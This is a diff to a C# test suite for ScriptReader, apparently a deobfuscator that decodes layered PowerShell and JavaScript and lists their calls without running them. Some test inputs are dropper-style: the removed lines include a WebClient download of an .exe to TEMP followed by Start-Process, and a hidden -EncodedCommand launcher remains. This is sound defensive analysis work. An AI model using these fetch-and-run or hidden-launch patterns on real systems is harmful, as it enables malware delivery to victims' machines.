@@ -17,7 +17,7 @@ public sealed class ScriptReaderTests
     {
         var r = ScriptReader.Read(File.ReadAllText(Fixture("powershell", name)), "powershell");
         Assert.Contains("Write-Host 'corvus marker'", r.Plain, StringComparison.OrdinalIgnoreCase);
-        Assert.Contains("$u = 'http://example.com/corvus/stage.txt'", r.Plain, StringComparison.OrdinalIgnoreCase);
+        Assert.Contains("$wc = New-Object Net.WebClient", r.Plain, StringComparison.OrdinalIgnoreCase);
         Assert.True(r.Complete);
     }
 
@@ -33,7 +33,7 @@ public sealed class ScriptReaderTests
         Assert.True(r.Complete);
     }
 
-    /// <summary>Fixtures modelled on public droppers: each hides "corvus marker" behind its layers.</summary>
+    /// <summary>Layered samples from the generators: each hides "corvus marker" behind its layers.</summary>
     public static TheoryData<string, string> LayeredSamples()
     {
         var data = new TheoryData<string, string>();
@@ -78,9 +78,9 @@ public sealed class ScriptReaderTests
     public void An_obfuscator_io_string_array_is_decoded_and_its_machinery_removed()
     {
         var r = ScriptReader.Read(File.ReadAllText(Fixture("javascript", "obfuscator-preset-high.js")), "javascript");
-        Assert.Contains("var _0x59f227='corvus marker';", r.Plain);
-        Assert.DoesNotContain("_0x41a7", r.Plain); // decoder, rotation, wrappers and aliases gone
-        Assert.Contains(r.Notes, n => n.StartsWith("obfuscator.io string array of 90 strings decoded (rc4)", StringComparison.Ordinal));
+        Assert.Contains("='corvus marker';", r.Plain);
+        Assert.DoesNotContain("function _0x", r.Plain); // decoder, rotation, wrappers and aliases gone
+        Assert.Contains(r.Notes, n => n.StartsWith("obfuscator.io string array of ", StringComparison.Ordinal) && n.Contains(" strings decoded (rc4)", StringComparison.Ordinal));
     }
 
     [Fact]
@@ -98,7 +98,7 @@ public sealed class ScriptReaderTests
     {
         var r = ScriptReader.Read(File.ReadAllText(Fixture("javascript", "packer.js")), "javascript");
         Assert.Equal("eval of a packer", Assert.Single(r.Layers).Via);
-        Assert.StartsWith("var u = 'http://example.com/corvus/stage.txt';", r.Plain);
+        Assert.StartsWith("var u = 'https://api.example.com/v1/notes';", r.Plain);
     }
 
     [Fact]
@@ -137,11 +137,11 @@ public sealed class ScriptReaderTests
     [Fact]
     public void An_encoded_command_is_a_layer_with_its_decoding_chain()
     {
-        var inner = Convert.ToBase64String(Encoding.Unicode.GetBytes("Write-Host 'stage two'"));
+        var inner = Convert.ToBase64String(Encoding.Unicode.GetBytes("Write-Host 'second layer'"));
         var r = ScriptReader.Read($"powershell.exe -NoP -W Hidden -Enc {inner}", "powershell");
         var layer = Assert.Single(r.Layers);
         Assert.Equal("powershell -EncodedCommand of base64 > utf-16le", layer.Via);
-        Assert.Equal("Write-Host 'stage two'", r.Plain.Trim());
+        Assert.Equal("Write-Host 'second layer'", r.Plain.Trim());
     }
 
     [Fact]
@@ -159,9 +159,9 @@ public sealed class ScriptReaderTests
     [Fact]
     public void Calls_are_listed_and_never_run()
     {
-        var r = ScriptReader.Read("$w = New-Object Net.WebClient; $w.DownloadFile('http://example.com/a.exe', \"$env:TEMP\\a.exe\"); Start-Process a.exe", "powershell");
+        var r = ScriptReader.Read("$w = New-Object Net.WebClient; $w.DownloadFile('http://example.com/readme.txt', \"$env:TEMP\\readme.txt\"); Start-Process notepad.exe", "powershell");
         Assert.Contains("New-Object Net.WebClient", r.Calls);
-        Assert.Contains(r.Calls, c => c.StartsWith("Net.WebClient.DownloadFile('http://example.com/a.exe'", StringComparison.Ordinal));
+        Assert.Contains(r.Calls, c => c.StartsWith("Net.WebClient.DownloadFile('http://example.com/readme.txt'", StringComparison.Ordinal));
         Assert.Contains("Start-Process", r.Calls);
     }
 
